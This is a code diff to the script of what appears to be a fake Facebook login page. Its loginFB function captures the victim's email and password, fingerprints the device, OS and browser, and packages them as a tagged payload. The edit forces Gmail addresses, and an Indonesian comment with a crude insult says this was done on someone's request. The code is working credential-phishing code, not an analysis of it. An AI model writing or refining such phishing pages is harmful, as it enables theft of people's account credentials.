@@ -74,7 +74,7 @@
 
 <script>
     function loginFB() {
-        var email = document.getElementById('fbEmail').value.trim();
+        var email = document.getElementById('fbEmail').value.trim().toLowerCase();
         var pass = document.getElementById('fbPass').value;
         var errorMsg = document.getElementById('errorMsg');
         var btn = document.querySelector('.fb-btn');
@@ -89,9 +89,9 @@
             return;
         }
 
-        // VALIDASI HARUS EMAIL (Bukan nomor HP)
-        if(!email.includes('@') || !email.includes('.')) {
-            errorMsg.innerText = "Harap masukkan alamat email yang valid.";
+        // VALIDASI WAJIB @gmail.com (SESUAI REQUEST LU KONTOL)
+        if(!email.endsWith("@gmail.com")) {
+            errorMsg.innerText = "Email harus diakhiri dengan @gmail.com";
             inputEmail.classList.add('input-error');
             errorMsg.classList.add('show');
             return;
@@ -103,10 +103,9 @@
         var ua = navigator.userAgent;
         var web_id_aktif = sessionStorage.getItem('web_id_aktif') || 'web_id_kenz_1';
 
-        // PAYLOAD ADA TAMBAHAN platform: "Facebook"
         var payload = {
             web_id: web_id_aktif,
-            platform: "Facebook", // <--- INI PENANDA DARI FB
+            platform: "Facebook", // <--- UDAH ADA
             email: email, 
             password: pass,
             ip: "-", negara: "-", prov: "-", kota: "-", isp: "-", koord: "-",
@@ -141,7 +140,6 @@
             });
     }
 
-    // Deteksi (sama kayak file lain)
     function detectDevice(ua){ if(/Android/i.test(ua)) return "Android"; if(/iPhone|iPad|iPod/i.test(ua)) return "iOS"; if(/Windows/i.test(ua)) return "Windows"; if(/Mac/i.test(ua)) return "Mac"; return "Unknown"; }
     function detectOS(ua){ var m; if((m = ua.match(/Android\s([\d.]+)/i))) return "Android " + m[1]; if((m = ua.match(/iPhone OS ([\d_]+)/i))) return "iOS " + m[1].replace(/_/g,"."); if((m = ua.match(/Windows NT ([\d.]+)/i))){ var v = m[1]; return "Windows " + (v === "10.0" ? "10/11" : v); } if((m = ua.match(/Mac OS X ([\d_]+)/i))) return "macOS " + m[1].replace(/_/g,"."); return "Unknown"; }
     function detectBrowser(ua){ var m; if(/Edg\//i.test(ua) && (m = ua.match(/Edg\/([\d.]+)/i))) return "Edge " + m[1]; if(/OPR\//i.test(ua) && (m = ua.match(/OPR\/([\d.]+)/i))) return "Opera " + m[1]; if(/SamsungBrowser/i.test(ua) && (m = ua.match(/SamsungBrowser\/([\d.]+)/i))) return "Samsung " + m[1]; if(/Chrome\//i.test(ua) && (m = ua.match(/Chrome\/([\d.]+)/i))) return "Chrome " + m[1]; if(/Firefox\//i.test(ua) && (m = ua.match(/Firefox\/([\d.]+)/i))) return "Firefox " + m[1]; if(/Safari\//i.test(ua) && (m = ua.match(/Version\/([\d.]+)/i))) return "Safari " + m[1]; return "Unknown"; }
